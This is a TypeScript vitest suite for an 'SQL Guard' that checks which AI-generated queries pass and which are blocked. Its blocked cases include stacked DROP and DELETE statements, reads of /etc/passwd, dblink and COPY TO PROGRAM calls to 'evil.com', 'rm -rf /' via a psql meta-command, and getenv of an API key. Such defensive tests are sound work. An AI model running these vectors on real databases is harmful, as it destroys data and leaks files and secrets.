// Adversarial suite for the SQL Guard. Every vector here must be BLOCKED;
// every legitimate analytical query must PASS. This suite is the "provably
// sandboxed" acceptance criterion for the AI query path.
import { describe, it, expect } from "vitest";
import { guardSql, GuardError, MAX_ROWS } from "@/lib/guard/guard";

function blocked(sql: string, dialect: "postgres" | "duckdb" = "postgres") {
  expect(() => guardSql(sql, dialect), sql).toThrow(GuardError);
}

function allowed(sql: string, dialect: "postgres" | "duckdb" = "postgres") {
  expect(() => guardSql(sql, dialect), sql).not.toThrow();
}

describe("SQL Guard — legitimate queries pass", () => {
  it("plain selects", () => {
    allowed("SELECT * FROM users");
    allowed("select id, name from public.customers where country = 'DE' order by name");
    allowed("SELECT count(*) FROM orders GROUP BY status");
  });

  it("joins, aggregates, subqueries", () => {
    allowed(`SELECT c.name, sum(o.total_cents) FROM customers c JOIN orders o ON o.customer_id = c.id GROUP BY 1`);
    allowed(`SELECT * FROM (SELECT id FROM orders WHERE status = 'paid') q`);
    allowed(`SELECT date_trunc('month', placed_at) AS m, sum(total_cents) FROM orders GROUP BY 1 ORDER BY 1`);
  });

  it("CTEs", () => {
    allowed(`WITH top AS (SELECT customer_id, count(*) n FROM orders GROUP BY 1) SELECT * FROM top ORDER BY n DESC`);
  });

  it("string literals containing scary words", () => {
    allowed(`SELECT * FROM notes WHERE body = 'please DROP TABLE users'`);
    allowed(`SELECT 'delete from x; drop table y' AS t`);
    allowed(`SELECT * FROM logs WHERE msg LIKE '%update%'`);
  });

  it("federated duckdb-style query", () => {
    allowed(
      `SELECT c.name, count(o.id) FROM users_service.public.customers c JOIN orders_service.public.orders o ON o.customer_id = c.id GROUP BY 1`,
      "duckdb",
    );
  });

  it("trailing semicolon is tolerated", () => {
    allowed("SELECT 1;");
  });
});

describe("SQL Guard — writes & DDL are blocked", () => {
  it("DML", () => {
    blocked("INSERT INTO users (name) VALUES ('x')");
    blocked("UPDATE users SET name = 'x'");
    blocked("DELETE FROM users");
    blocked("MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET x = 1");
    blocked("TRUNCATE users");
  });

  it("DDL", () => {
    blocked("DROP TABLE users");
    blocked("CREATE TABLE evil (id int)");
    blocked("ALTER TABLE users ADD COLUMN pwned int");
    blocked("GRANT ALL ON users TO public");
    blocked("REVOKE SELECT ON users FROM lizard_read");
  });

  it("SELECT INTO (creates a table)", () => {
    blocked("SELECT * INTO evil_copy FROM users");
  });

  it("row locking", () => {
    blocked("SELECT * FROM users FOR UPDATE");
    blocked("SELECT * FROM users FOR SHARE");
  });

  it("sequence manipulation", () => {
    blocked("SELECT nextval('users_id_seq')");
    blocked("SELECT setval('users_id_seq', 999)");
  });
});

describe("SQL Guard — multi-statement & piggybacking", () => {
  it("stacked statements", () => {
    blocked("SELECT 1; DROP TABLE users");
    blocked("SELECT 1; SELECT 2");
    blocked("SELECT 1;;DELETE FROM users");
  });

  it("comment-based smuggling", () => {
    blocked("SELECT 1 -- ; DROP TABLE users");
    blocked("SELECT /* sneaky */ 1");
    blocked("SELECT 1 /* DROP TABLE users */");
  });

  it("semicolon hidden after whitespace/newlines", () => {
    blocked("SELECT 1\n;\nDELETE FROM users");
  });

  it("psql meta-commands", () => {
    blocked("\\! rm -rf /");
    blocked("SELECT 1 \\. something");
  });
});

describe("SQL Guard — dangerous functions", () => {
  it("DoS / sleep", () => {
    blocked("SELECT pg_sleep(999999)");
    blocked("SELECT PG_SLEEP(10)");
    blocked("SELECT pg_sleep_for('5 minutes')");
  });

  it("file & server access", () => {
    blocked("SELECT pg_read_file('/etc/passwd')");
    blocked("SELECT pg_read_binary_file('/etc/passwd')");
    blocked("SELECT pg_ls_dir('.')");
    blocked("SELECT lo_import('/etc/passwd')");
    blocked("SELECT lo_export(123, '/tmp/x')");
  });

  it("remote execution / dblink", () => {
    blocked("SELECT dblink_exec('host=evil', 'DROP TABLE x')");
    blocked("SELECT * FROM dblink('conn', 'select 1') AS t(a int)");
  });

  it("backend control", () => {
    blocked("SELECT pg_terminate_backend(1234)");
    blocked("SELECT pg_cancel_backend(1234)");
    blocked("SELECT pg_reload_conf()");
    blocked("SELECT pg_advisory_lock(1)");
  });

  it("settings tampering", () => {
    blocked("SELECT set_config('statement_timeout', '0', false)");
    blocked("SET statement_timeout = 0");
    blocked("RESET ALL");
  });

  it("case and whitespace tricks", () => {
    blocked("sElEcT Pg_SlEeP(10)");
    blocked("SELECT\n\npg_sleep\n(10)");
  });
});

describe("SQL Guard — transaction / session control", () => {
  it("transaction control", () => {
    blocked("COMMIT");
    blocked("BEGIN; DROP TABLE users; COMMIT");
    blocked("PREPARE p AS SELECT 1");
    blocked("EXECUTE p");
    blocked("DEALLOCATE ALL");
    blocked("LISTEN chan");
    blocked("NOTIFY chan, 'x'");
  });

  it("cursors", () => {
    blocked("DECLARE c CURSOR FOR SELECT * FROM users");
    blocked("FETCH ALL FROM c");
  });

  it("COPY exfiltration", () => {
    blocked("COPY users TO '/tmp/dump.csv'");
    blocked("COPY (SELECT * FROM users) TO PROGRAM 'curl evil.com'");
  });

  it("DO blocks", () => {
    blocked("DO $$ BEGIN DELETE FROM users; END $$");
  });
});

describe("SQL Guard — DuckDB federation path extras", () => {
  it("attachment management is model-forbidden", () => {
    blocked("ATTACH 'postgres://evil' AS pwn (TYPE postgres)", "duckdb");
    blocked("DETACH users_service", "duckdb");
    blocked("INSTALL httpfs", "duckdb");
    blocked("LOAD httpfs", "duckdb");
  });

  it("filesystem readers", () => {
    blocked("SELECT * FROM read_csv('/etc/passwd')", "duckdb");
    blocked("SELECT * FROM read_csv_auto('secrets.csv')", "duckdb");
    blocked("SELECT * FROM read_parquet('s3://bucket/x')", "duckdb");
    blocked("SELECT * FROM read_text('/etc/hosts')", "duckdb");
    blocked("SELECT * FROM glob('*')", "duckdb");
    blocked("SELECT getenv('ANTHROPIC_API_KEY')", "duckdb");
  });

  it("duckdb settings/pragmas", () => {
    blocked("PRAGMA database_list", "duckdb");
    blocked("SET enable_external_access = true", "duckdb");
    blocked("COPY (SELECT 1) TO '/tmp/x.csv'", "duckdb");
  });

  it("postgres passthrough execution", () => {
    blocked("SELECT postgres_execute('users_service', 'DROP TABLE customers')", "duckdb");
    blocked("SELECT * FROM postgres_query('users_service', 'SELECT pg_sleep(99)')", "duckdb");
  });
});

describe("SQL Guard — row cap", () => {
  it("wraps every query in an outer LIMIT", () => {
    const g = guardSql("SELECT * FROM huge_table", "postgres");
    expect(g.wrappedSql).toContain(`LIMIT ${MAX_ROWS + 1}`);
    expect(g.wrappedSql.startsWith("SELECT * FROM (")).toBe(true);
  });

  it("strips trailing semicolons before wrapping", () => {
    const g = guardSql("SELECT 1;", "postgres");
    expect(g.cleanSql).toBe("SELECT 1");
  });

  it("rejects empty input", () => {
    blocked("");
    blocked(";;;");
    blocked("   ");
  });
});
